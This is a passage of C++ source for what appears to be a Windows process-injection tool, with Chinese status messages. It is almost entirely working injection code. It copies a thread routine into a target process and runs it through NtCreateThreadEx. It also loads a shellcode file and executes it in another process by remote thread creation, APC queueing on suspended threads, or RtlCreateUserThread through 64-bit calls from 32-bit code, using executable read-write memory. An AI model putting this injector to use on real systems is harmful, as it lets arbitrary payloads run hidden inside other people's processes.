		if (!WriteProcessMemory(hProc, pThreadData, &data, sizeof(data), NULL))
		{
			SendError(_T("WriteProcessMemory  error"));
			VirtualFreeEx(hProc, pThreadData, 0, MEM_RELEASE);
			break;
		}
	/*	DWORD endsize = (DWORD)ThreadProcEnd;
		DWORD Procsize = (DWORD)ThreadProc;
		DWORD sizeOfCode = Procsize - endsize;*/
		DWORD sizeOfCode = (DWORD)ThreadProcEnd - (DWORD)ThreadProc;
		pCode = VirtualAllocEx(hProc, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (pCode == NULL)
		{
			SendError(_T("VirtualAllocEx2 error"));
			VirtualFreeEx(hProc, pThreadData, 0, MEM_RELEASE);
			break;
		}
		if (!WriteProcessMemory(hProc, pCode, (PVOID)ThreadProc, 4096, NULL))
		{
			SendError(_T("WriteProcessMemory2 error"));
			VirtualFreeEx(hProc, pThreadData, 0, MEM_RELEASE);
			VirtualFreeEx(hProc, pCode, 0, MEM_RELEASE);
			break;
		}
		FARPROC     pFunc = NULL;
		pFunc = GetProcAddress(hNtdll, "NtCreateThreadEx");
		if (pFunc == NULL)
		{
			SendError(_T("NtCreateThreadEx error"));
			VirtualFreeEx(hProc, pThreadData, 0, MEM_RELEASE);
			VirtualFreeEx(hProc, pCode, 0, MEM_RELEASE);
			break;
		}
		((pfnNtCreateThreadEx)pFunc)(&hThread, 0x1FFFFF, NULL, hProc, pCode, pThreadData, Flags, NULL, NULL, NULL, NULL);
		if (hThread == NULL) 
			SendError(_T("注入失败"));
		else
			SendError(_T("注入成功"));

	}
	break;
	default:
		break;
	}
	CloseHandle(hProc);
}



void CInjectManager::Inject_shellcode()
{
	HANDLE hFile = CreateFile(m_sinjectmode.DllName, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		SendError(_T("打开文件失败"));
		return;
	}
	DWORD dwSize = 0;
	dwSize = GetFileSize(hFile, NULL);
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, m_sinjectmode.dwProcessID);
	if (hProc == NULL)
	{
		SendError(_T("打开进程失败"));
		return;
	}
	LPBYTE lpAddress = new BYTE[dwSize];
	if (lpAddress == NULL)
	{
		SendError(_T("VirtualAlloc Error"));
		CloseHandle(hFile);
		return;
	}
	DWORD dwRead = 0;
	ReadFile(hFile, lpAddress, dwSize, &dwRead, 0);

	switch (m_sinjectmode.einjectmode)
	{

	case MODE_CreateRemoteThread_shellcode:
	{
#ifdef _WIN64
		LPVOID RemotlpAddress = VirtualAllocEx(hProc, NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		WriteProcessMemory(hProc, RemotlpAddress, lpAddress, dwSize, NULL);
		HANDLE	ThreadShellCode = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)RemotlpAddress, NULL, 0, NULL);
#else
		DWORD64 RemotlpAddress = yapi::VirtualAllocEx64(hProc, NULL, (SIZE_T)dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		yapi::WriteProcessMemory64(hProc, RemotlpAddress, lpAddress, dwSize, NULL);
		HANDLE	ThreadShellCode = yapi::CreateRemoteThread64(hProc, NULL, 0, RemotlpAddress, NULL, 0, NULL);
#endif
		if (ThreadShellCode)		CloseHandle(ThreadShellCode);
		SendError(_T("注入shellcode成功"));
	}
	break;
	case MODE_QueueUserAPC_shellcode:
	{
		FARPROC fpAddresses[5] = {
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtAllocateVirtualMemory"),
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtWriteVirtualMemory"),
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtSuspendThread"),
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtAlertResumeThread"),
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtQueueApcThread")
		};
		pNtAllocateVirtualMemory fNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)fpAddresses[0];
		pNtWriteVirtualMemory fNtWriteVirtualMemory = (pNtWriteVirtualMemory)fpAddresses[1];
		pNtSuspendThread fNtSuspendThread = (pNtSuspendThread)fpAddresses[2];
		pNtAlertResumeThread fNtAlertResumeThread = (pNtAlertResumeThread)fpAddresses[3];
		pNtQueueApcThread fNtQueueApcThread = (pNtQueueApcThread)fpAddresses[4];
		HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
		THREADENTRY32 te32;
		hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		if (hThreadSnap == INVALID_HANDLE_VALUE) {
			SendError(_T("无法获取线程快照"));
			break;
		}
		te32.dwSize = sizeof(THREADENTRY32);
		DWORD threadId;
		if (!Thread32First(hThreadSnap, &te32)) {
			SendError(_T("无法获得第一个线程"));
			break;
		}
		do {
			if (te32.th32OwnerProcessID == m_sinjectmode.dwProcessID) {
				threadId = te32.th32ThreadID;
				HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
				if (hThread) {
					//#ifdef _WIN64
					LPVOID RemotlpAddress = VirtualAllocEx(hProc, NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
					WriteProcessMemory(hProc, RemotlpAddress, lpAddress, dwSize, NULL);
					//#else
					//					DWORD64 RemotlpAddress = yapi::VirtualAllocEx64(hProc, NULL, (SIZE_T)dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
					//					yapi::WriteProcessMemory64(hProc, RemotlpAddress, lpAddress, dwSize, NULL);
					//#endif
					pNtSuspendThread NtSuspendThread = NULL;
					if (fNtSuspendThread)
					{
						ULONG SuspendCount = 0;
						fNtSuspendThread(hThread, &SuspendCount);
					}
					DWORD dwResult = fNtQueueApcThread(hThread, (PIO_APC_ROUTINE)RemotlpAddress, NULL, NULL, NULL);
					if (fNtAlertResumeThread)
					{
						ULONG SuspendCount = 0;
						fNtAlertResumeThread(hThread, &SuspendCount);
					}
					if (dwResult) {
						SendError(_T("有效载荷在线程中成功注入"));
						break;;
					}
					else
					{
						SendError(_T("调用错误QueueUSerAPC().继续尝试其他线程"));
						continue;
					}
				}
				else {
					SendError(_T("获取找到的线程 ID 时出错"));
					break;;
				}
			}
		} while (Thread32Next(hThreadSnap, &te32));

		if (!threadId)
			SendError(_T("没有线程用于进程"));
		CloseHandle(hThreadSnap);
	}
	break;
	case MODE_NtCreateThreadEx_shellcode:
	{

#ifdef _WIN64
		LPVOID RemotlpAddress = VirtualAllocEx(hProc, NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		WriteProcessMemory(hProc, RemotlpAddress, lpAddress, dwSize, NULL);
		pfnNtCreateThreadEx NtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtCreateThreadEx");
		if (NtCreateThreadEx == NULL) break;
		HANDLE ThreadShellCode = NULL;
		NtCreateThreadEx(&ThreadShellCode, /*0x1FFFFF*/THREAD_ALL_ACCESS, NULL, hProc, (LPTHREAD_START_ROUTINE)RemotlpAddress, NULL, Flags, NULL, NULL, NULL, NULL);
		if (ThreadShellCode == NULL) break;
#else
		DWORD64 RemotlpAddress = yapi::VirtualAllocEx64(hProc, NULL, (SIZE_T)dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		yapi::WriteProcessMemory64(hProc, RemotlpAddress, lpAddress, dwSize, NULL);
		yapi::X64Call RtlCreateUserThread("RtlCreateUserThread");
		HANDLE ThreadShellCode = NULL;
		RtlCreateUserThread(&ThreadShellCode, /*0x1FFFFF*/THREAD_ALL_ACCESS, NULL, hProc, (LPTHREAD_START_ROUTINE)RemotlpAddress, NULL, Flags, NULL, NULL, NULL, NULL);
		if (ThreadShellCode == NULL) break;

#endif
		if (ThreadShellCode)		CloseHandle(ThreadShellCode);
		SendError(_T("注入shellcode成功"));
	}
	break;

	default:
		break;
	}

	CloseHandle(hProc);
	SAFE_DELETE_AR(lpAddress);

}
